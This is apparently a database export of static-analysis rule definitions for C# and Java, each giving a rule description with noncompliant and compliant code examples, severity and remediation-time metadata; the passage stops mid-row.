141	"[Optional]" should not be used on "ref" or "out" parameters	S3447	\N	csharpsquid	<p>\n    The use of <code>ref</code> or <code>out</code> in combination with <code>[Optional]</code> is both confusing and contradictory.\n    <code>[Optional]</code> indicates that the parameter doesn't have to be provided, while out and ref mean that the parameter will be used\n    to return data to the caller (<code>ref</code> additionally indicates that the parameter may also be used to pass data into the method).\n</p>\n<p>\n    Thus, making it <code>[Optional]</code> to provide the parameter in which you will be passing back the method results doesn't make sense.\n    In fact, the compiler will raise an error on such code. Unfortunately, it raises the error on method calls where the\n    <code>[Optional]</code> parameter has been omitted, not the source of the problem, the method declaration.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n    public void DoStuff([Optional] ref int i) // Noncompliant\n    {\n        Console.WriteLine(i);\n    }\n\n    public static void Main()\n    {\n        new MyClass().DoStuff(); // This doesn't compile, CS7036 shows\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass\n{\n  public void DoStuff(ref int i)\n  {\n    Console.WriteLine(i);\n  }\n\n  public static void Main()\n  {\n    var i = 42;\n    new MyClass().DoStuff(ref i);\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453806435	1511453806436	1
142	"switch" statements should have at least 3 "case" clauses	S1301	\N	csharpsquid	<p>\n    <code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.\n</p>\n<p>\n    For just one or two cases however, the code will be more readable with <code>if</code> statements.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (variable)\n{\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (variable == 0)\n{\n  doSomething();\n} else\n{\n  doSomethingElse();\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause.</li>\n    <li>MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause.</li>\n    <li>MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses</li>\n</ul>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453806437	1511453806437	1
143	"ThreadStatic" fields should not be initialized	S2996	\N	csharpsquid	<p>\n    When an object has a field annotated with <code>ThreadStatic</code>, that field is shared within a given thread,\n    but unique across threads. Since a class' static initializer is only invoked for the\n    first thread created, it also means that only the first thread will have the expected initial values.\n</p>\n<p>\n    Instead, allow such fields to be initialized to their default values or make the initialization lazy.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n  [ThreadStatic]\n  public static object PerThreadObject = new object(); // Noncompliant. Will be null in all the threads except the first one.\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo\n{\n  [ThreadStatic]\n  public static object _perThreadObject;\n  public static object PerThreadObject\n  {\n    get\n    {\n      if (_perThreadObject == null)\n      {\n        _perThreadObject = new object();\n      }\n      return _perThreadObject;\n    }\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading	f	HTML	1511453806438	1511453806439	2
144	Boolean checks should not be inverted	S1940	\N	csharpsquid	<p>\n    It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( !(a == 2)) { ... }  // Noncompliant\nbool b = !(i < 10);  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (a != 2) { ... }\nbool b = (i >= 10);\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453806439	1511453806440	1
148	Methods should not have too many parameters	S107	\N	csharpsquid	<p>\nA long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many things.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>The following code snippet illustrates this rule with a maximum number of 4 parameters:</p>\n<pre>\npublic void doSomething(int param1, int param2, int param3, string param4, long param5)\n{\n...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(int param1, int param2, int param3, string param4)\n{\n...\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453806444	1511453806445	1
149	Files should not have too many lines	S104	\N	csharpsquid	<p>\nA source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\nAbove a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks.\nThose smaller files will not only be easier to understand but also probably easier to test.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	brain-overload	f	HTML	1511453806449	1511453806450	1
150	Tabulation characters should not be used	S105	\N	csharpsquid	<p>\nDevelopers should not need to configure the tab width of their text editors in order to be able to read source code.\nSo the use of tabulation character must be banned.\n</p>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806454	1511453806455	1
151	Lines should not be too long	S103	\N	csharpsquid	<p>\nHaving to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.\n</p>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806455	1511453806456	1
152	Result of integer division should not be assigned to floating point variable	S2184	\N	csharpsquid	<p>\n    When division is performed on <code>int</code>s, the result will always be an <code>int</code>. You can assign that result to a\n    <code>double</code>, <code>float</code> or <code>decimal</code> with automatic type conversion, but having started as an\n    <code>int</code>, the result will likely not be what you expect. If the result of <code>int</code> division is assigned to a\n    floating-point variable, precision will have been lost before the assignment. Instead, at least one operand should be cast or\n    promoted to the final type before the operation takes place.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstatic void Main()\n{\n  decimal dec = 3/2; // Noncompliant\n  Method(3/2); // Noncompliant\n}\nstatic void Method(float f) { }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstatic void Main()\n{\n  decimal dec = (decimal)3/2;\n  Method(3.0F/2);\n}\nstatic void Method(float f) { }\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cwe,sans-top25-risky	f	HTML	1511453806460	1511453806461	2
153	"goto" statement should not be used	S907	\N	csharpsquid	<p>\n    <code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable.\n    Structured control flow statements such as <code>if</code>, <code>for</code>, <code>while</code>,\n    <code>continue</code> or <code>break</code> should be used instead.\n</p>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 14.4 - The goto statement shall not be used.</li>\n    <li>MISRA C:2012, 15.1 - The goto statement should not be used</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload,misra	f	HTML	1511453806461	1511453806462	1
154	Console logging should not be used	S2228	\N	csharpsquid	<p>\n    Debug statements are always useful during development. But include them in production code - particularly\n    in code that runs client-side - and you run the risk of inadvertently exposing sensitive information.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate void DoSomething ()\n{\n  // ...\n  Console.WriteLine ("so far, so good..."); // Noncompliant\n  // ...\n}\n</pre>\n\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	owasp-a6	f	HTML	1511453806462	1511453806463	3
155	Variables should not be self-assigned	S1656	\N	csharpsquid	<p>\nThere is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake and some other value or variable was intended for the assignment instead.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void setName(string name)\n{\n    name = name;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void setName(string name)\n{\n    this.name = name;\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	3min	\N	\N	cert	f	HTML	1511453806464	1511453806464	2
156	Multiple variables should not be declared on the same line	S1659	\N	csharpsquid	<p>\n    Declaring multiple variable on one line is difficult to read.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n  private int a, b; // Noncompliant\n\n  public void Method()\n  {\n    int c, d; // Noncompliant\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass\n{\n  private int a;\n  private int b;\n\n  public void Method()\n  {\n    int c;\n    int d;\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806465	1511453806466	1
157	"base.Equals" should not be used to check for reference equality in "Equals" if "base" is not "object"	S3397	\N	csharpsquid	<p>\n    <code>object.Equals()</code> overrides can be optimized by checking first for reference equality between <code>this</code> and the\n    parameter. This check can be implemented by calling <code>object.ReferenceEquals()</code> or <code>base.Equals()</code>, where\n    <code>base</code> is <code>object</code>. However, using <code>base.Equals()</code> is a maintenance hazard because while it works\n    if you extend <code>Object</code> directly, if you introduce a new base class that overrides <code>Equals</code>, it suddenly stops\n    working.\n</p>\n<p>\n    This rule raises an issue if <code>base.Equals()</code> is used but <code>base</code> is not <code>object</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Base\n{\n  private int baseField;\n\n  public override bool Equals(object other)\n  {\n    if (base.Equals(other)) // Okay; base is object\n    {\n      return true;\n    }\n\n    return this.baseField == ((Base)other).baseField;\n  }\n}\n\nclass Derived : Base\n{\n  private int derivedField;\n\n  public override bool Equals(object other)\n  {\n    if (base.Equals(other))  // Noncompliant\n    {\n      return true;\n    }\n\n    return this.derivedField == ((Derived)other).derivedField;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Base\n{\n  private int baseField;\n\n  public override bool Equals(object other)\n  {\n    if (object.ReferenceEquals(this, other))  // base.Equals is okay here, but object.ReferenceEquals is better\n    {\n      return true;\n    }\n\n    return this.baseField == ((Base)other).baseField;\n  }\n}\n\nclass Derived : Base\n{\n  private int derivedField;\n\n  public override bool Equals(object other)\n  {\n    if (object.ReferenceEquals(this, other))\n    {\n      return true;\n    }\n\n    return base.Equals(other) &amp;&amp; this.derivedField == ((Derived)other).derivedField;\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806466	1511453806466	2
158	"FIXME" tags should be handled	S1134	\N	csharpsquid	<p>\n    <code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with\n    later.\n</p>\n<p>\n    Sometimes the developer will not have the time or will simply forget to get back to that tag.\n</p>\n<p>\n    This rule is meant to track those tags, and ensure that they do not go unnoticed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate int Divide(int numerator, int denominator)\n{\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453806467	1511453806467	1
591	Enumeration should not be implemented	S1150	S1150	squid	<p>From the official Oracle Javadoc:</p>\n<blockquote>\n<p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>\n</blockquote>\n<p>The following code:</p>\n<pre>\npublic class MyClass implements Enumeration {  // Noncompliant\n  /* ... */\n}\n</pre>\n<p>should be refactored into:</p>\n<pre>\npublic class MyClass implements Iterator {     // Compliant\n  /* ... */\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	obsolete	f	HTML	1511453807128	1511453807128	1
592	Comments matching a regular expression should be handled	S124	S124	squid	<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>\n<p>For example, one can create a rule with the regular expression <code>.*TODO.*</code> to match all comment containing "TODO".</p>\n<p>Note that, in order to match TODO regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in <code>(?i).*TODO.*</code>.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	t	HTML	1511453807129	1511453807129	1
593	"switch case" clauses should not have too many lines	S1151	S1151	squid	<p>\n  The <code>switch</code> statement should be used only to clearly define some new branches in the control flow.\n  As soon as a <code>case</code> clause contains too many statements this highly decreases the readability\n  of the overall control flow statement. In such case, the content of <code>case</code> clause should\n  be extracted in a dedicated method.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 5:</p>\n<pre>\nswitch (myVariable) {\n  case 0: // 6 lines till next case\n    methodCall1("");\n    methodCall2("");\n    methodCall3("");\n    methodCall4("");\n    break;\n  case 1:\n  ...\n}\n</pre> \n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 0:                  \n    doSomething()\n    break;\n  case 1:\n  ...\n}\n...\nprivate void doSomething(){\n    methodCall1("");\n    methodCall2("");\n    methodCall3("");\n    methodCall4("");\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	brain-overload	f	HTML	1511453807130	1511453807131	1
159	Flags enumerations should explicitly initialize all their members	S2345	\N	csharpsquid	<p>\n    Flags enumerations should not rely on the language to initialize the values of their members. Implicit initialization\n    will set the first member to 0, and increment the value by one for each subsequent member. This implicit behavior does\n    not allow members to be combined using the bitwise or operator.\n</p>\n<p>\n    Instead, powers of two, i.e. 1, 2, 4, 8, 16, etc. should be used to explicitly initialize all the members.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n[Flags]\nenum FruitType    // Non-Compliant\n{\n    Banana,\n    Orange,\n    Strawberry\n}\nclass Program\n{\n    static void Main()\n    {\n        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;\n        // Will display only Strawberry!\n        Console.WriteLine(bananaAndStrawberry.ToString());\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\n[Flags]\nenum FruitType    // Non-Compliant\n{\n    Banana = 1,\n    Orange = 2,\n    Strawberry = 4\n}\nclass Program\n{\n    static void Main()\n    {\n        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;\n        // Will display Banana and Strawberry, as expected.\n        Console.WriteLine(bananaAndStrawberry.ToString());\n    }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806468	1511453806469	2
160	"TODO" tags should be handled	S1135	\N	csharpsquid	<p>\n    <code>TODO</code> tags are commonly used to mark places where some more code is required, but which the\n    developer wants to implement later.\n</p>\n<p>\n    Sometimes the developer will not have the time or will simply forget to get back to that tag.\n</p>\n<p>\n    This rule is meant to track those tags, and ensure that they do not go unnoticed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate void DoSomething()\n{\n  // TODO\n}\n</pre>	0	\N	READY	cs	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453806470	1511453806470	1
161	Enumeration type names should not have "Flags" or "Enum" suffixes	S2344	\N	csharpsquid	<p>\n    The information that an enumeration type is actually an enumeration or a set of flags should not be duplicated in its name.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nenum FooFlags // Noncompliant\n{\n    Foo = 1\n    Bar = 2\n    Baz = 4\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nenum Foo\n{\n    Foo = 1\n    Bar = 2\n    Baz = 4\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806471	1511453806471	1
162	Non-constant static fields should not be visible	S2223	\N	csharpsquid	<p>\n    A <code>static</code> field that is neither constant nor read-only is not thread-safe. Correctly accessing\n    these fields from different threads needs synchronization with <code>lock</code>s. Improper synchronization\n    may lead to unexpected results, thus publicly visible static fields are best suited for storing non-changing\n    data shared by many consumers. To enforce this intent, these fields should be marked <code>readonly</code> or\n    converted to a constant.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Math\n{\n  public static double Pi = 3.14;  // Noncompliant\n}\n</pre>\nor\n<pre>\npublic class Shape\n{\n  public static Shape Empty = new EmptyShape();  // Noncompliant\n\n  private class EmptyShape : Shape\n  {\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Math\n{\n  public const double Pi = 3.14;\n}\n</pre>\nor\n<pre>\npublic class Shape\n{\n  public static readonly Shape Empty = new EmptyShape();\n\n  private class EmptyShape : Shape\n  {\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453806472	1511453806472	1
163	Static fields should not be used in generic types	S2743	\N	csharpsquid	<p>\n    A static field in a generic type is not shared among instances of different closed constructed types, thus <code>LengthLimitedSingletonCollection&lt;int&gt;.instances</code>\n    and <code>LengthLimitedSingletonCollection&lt;string&gt;.instances</code> will point to different objects, even though <code>instances</code> is seemingly shared among all\n    <code>LengthLimitedSingletonCollection&lt;&gt;</code> generic classes.\n</p>\n<p>\n    If you need to have a static field shared among instances with different generic arguments, define a non-generic base class to store your static members, then set your generic type to inherit from the base class.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class LengthLimitedSingletonCollection&lt;T&gt; where T : new()\n{\n  protected const int MaxAllowedLength = 5;\n  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;(); // Noncompliant\n  public static T GetInstance()\n  {\n    object instance;\n    if (!instances.TryGetValue(typeof(T), out instance))\n    {\n      if (instances.Count >= MaxAllowedLength)\n      {\n        throw new Exception();\n      }\n      instance = new T();\n      instances.Add(typeof(T), instance);\n    }\n    return (T)instance;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class SingletonCollectionBase\n{\n  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;();\n}\npublic class LengthLimitedSingletonCollection&lt;T&gt; : SingletonCollectionBase where T : new()\n{\n  protected const int MaxAllowedLength = 5;\n  public static T GetInstance()\n  {\n    object instance;\n    if (!instances.TryGetValue(typeof(T), out instance))\n    {\n      if (instances.Count >= MaxAllowedLength)\n      {\n        throw new Exception();\n      }\n      instance = new T();\n      instances.Add(typeof(T), instance);\n    }\n    return (T)instance;\n  }\n}\n</pre>\n\n<h2>Exception</h2>\n<p>\n    If the static field or property uses a type parameter, then the developer is assumed to understand that the static member is not shared among the closed constructed types.\n</p>\n<pre>\npublic class Cache&lt;T&gt;\n{\n  private static Dictionary&lt;string, T&gt; CacheDictionary { get; set; } // Compliant\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453806473	1511453806473	1
164	Flags enumerations zero-value members should be named "None"	S2346	\N	csharpsquid	<p>\n    Consisitent use of "None" in flags enumerations indicates that all flag values are cleared.\n    The value 0 should not be used to indicate any other state, since there is no way to check that the bit <code>0</code> is set.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n[Flags]\nenum FruitType\n{\n    Void = 0,       // Non-Compliant\n    Banana = 1,\n    Orange = 2,\n    Strawberry = 4\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\n[Flags]\nenum FruitType\n{\n    None = 0,       // Compliant\n    Banana = 1,\n    Orange = 2,\n    Strawberry = 4\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806475	1511453806475	1
165	"ToString()" method should not return null	S2225	\N	csharpsquid	<p>\n    Calling <code>ToString()</code> on an object should always return a string. Returning <code>null</code> instead contravenes the method's implicit contract.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic override string ToString ()\n{\n  if (this.collection.Count == 0)\n  {\n    return null; // Noncompliant\n  }\n  else\n  {\n    // ...\n\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic override string ToString ()\n{\n  if (this.collection.Count == 0)\n  {\n    return "";\n  }\n  else\n  {\n    // ...\n\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li><a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453806476	1511453806476	2
166	CA2111: Pointers should not be visible	PointersShouldNotBeVisible	CA2111	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected <code>System.IntPtr</code> or <code>System.UIntPtr</code> field is not read-only.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>IntPtr</code>\n               and <code>UIntPtr</code> are pointer types that are used to access unmanaged memory. If a pointer is not private, internal, or read-only, malicious code can change the value of the pointer, potentially allowing access to arbitrary locations in memory or causing application or system failures.\n            If you intend to secure access to the type that contains the pointer field, see {rule:fxcop:SecuredTypesShouldNotExposeFields}.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Secure the pointer by making it read-only, internal, or private.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if you do not rely on the value of the pointer.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:SecuredTypesShouldNotExposeFields}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareVisibleInstanceFields}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182306.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182306.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806478	1511453806478	1
169	CA1814: Prefer jagged arrays over multidimensional	PreferJaggedArraysOverMultidimensional	CA1814	fxcop	<h2>Cause</h2>\n<p>\n            A member is declared as a multidimensional array.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A jagged array is an array whose elements are arrays. The arrays that make up the elements can be of different sizes, leading to less wasted space for some sets of data.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the multidimensional array to a jagged array.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if the multidimensional array does not waste space.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182277.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182277.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806491	1511453806491	1
167	CA1403: Auto layout types should not be COM visible	AutoLayoutTypesShouldNotBeComVisible	CA1403	fxcop	<h2>Cause</h2>\n<p>\n            A Component Object Model (COM) visible value type is marked with the <code>System.Runtime.InteropServices.StructLayoutAttribute</code> attribute set to <code>LayoutKind.Auto</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>Auto</code>\n               layout types are managed by the common language runtime. The layout of these types can change between versions of the .NET Framework, which will break COM clients that expect a specific layout. Note that if the <code>StructLayoutAttribute</code> attribute is not specified, the C#, Visual Basic, and C++ compilers specify the <code>Sequential</code> layout for value types.\n            Unless marked otherwise, all public nongeneric types are visible to COM; all nonpublic and generic types are invisible to COM. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated; the containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the value of the <code>StructLayoutAttribute</code> attribute to <code>Explicit</code> or <code>Sequential</code>, or make the type invisible to COM.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotUseAutoDualClassInterfaceType}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182194.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182194.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806482	1511453806483	1
168	CA2207: Initialize value type static fields inline	InitializeValueTypeStaticFieldsInline	CA2207	fxcop	<h2>Cause</h2>\n<p>\n            A value-type declares an explicit static constructor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a value-type is declared, it undergoes a default initialization where all value-type fields are set to zero and all reference-type fields are set to <code>null</code> (<code>Nothing</code> in Visual Basic). An explicit static constructor is only guaranteed to run before an instance constructor or static member of the type is called. Therefore, if the type is created without calling an instance constructor, the static constructor is not guaranteed to run.\n            If all static data is initialized inline and no explicit static constructor is declared, the C# and Visual Basic compilers add the <code>beforefieldinit</code> flag to the MSIL class definition. The compilers also add a private static constructor that contains the static initialization code. This private static constructor is guaranteed to run before any static fields of the type are accessed.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule initialize all static data when it is declared and remove the static constructor.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:InitializeReferenceTypeStaticFieldsInline}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182346.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182346.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806487	1511453806488	1
170	CA5122: P/Invoke declarations should not be safe critical	PInvokesShouldNotBeSafeCriticalFxCopRule	CA5122	fxcop	<h2>Cause</h2>\n<p>\n            A P/Invoke declaration has been marked with a <code>SecuritySafeCriticalAttribute</code>:\n\n\n\n\n\n\n\n\n\n            <pre>\n[assembly: AllowPartiallyTrustedCallers]\n\n// ...\npublic class C\n{\n    [SecuritySafeCritical]\n    [DllImport("kernel32.dll")]\n    public static extern bool Beep(int frequency, int duration); // CA5122 – safe critical p/invoke\n   }\n</pre>\n\n\n\n\nIn this example, C.Beep(...) has been marked as a security safe critical method.\n\n\n\n\n\n\n                Rule Description\n\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To make a P/Invoke available to transparent code, expose a security safe critical wrapper method for it:\n\n\n\n\n\n\n\n\n\n            <pre>\n[assembly: AllowPartiallyTrustedCallers\n\nclass C\n{\n   [SecurityCritical]\n   [DllImport(“kernel32.dll”, EntryPoint=”Beep”)]\n   private static extern bool BeepPinvoke(int frequency, int duration); // Security Critical P/Invoke\n\n   [SecuritySafeCritical]\n   public static bool Beep(int frequency, int duration)\n   {\n      return BeepPInvoke(frequency, duration);\n   }\n}\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                When to Suppress Warnings\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dn621099.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dn621099.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	f	HTML	1511453806494	1511453806494	1
171	CA1303: Do not pass literals as localized parameters	DoNotPassLiteralsAsLocalizedParameters	CA1303	fxcop	<h2>Cause</h2>\n<p>\n            A method passes a string literal as a parameter to a constructor or method in the .NET Framework class library and that string should be localizable.\n            This warning is raised when a literal string is passed as a value to a parameter or property and one or more of the following cases is true:\n            <ul>\n              <li>\n                The <code>LocalizableAttribute</code> attribute of the parameter or property is set to true.\n              </li>\n              <li>\n                The parameter or property name contains "Text", "Message", or "Caption".\n              </li>\n              <li>\n                The name of the string parameter that is passed to a Console.Write or Console.WriteLine method is either "value" or "format".\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            String literals that are embedded in source code are difficult to localize.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the string literal with a string retrieved through an instance of the <code>ResourceManager</code> class.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the code library will not be localized, or if the string is not exposed to the end user or a developer using the code library.\n            Users can eliminate noise against methods which should not be passed localized strings by either renaming the parameter or property named, or by 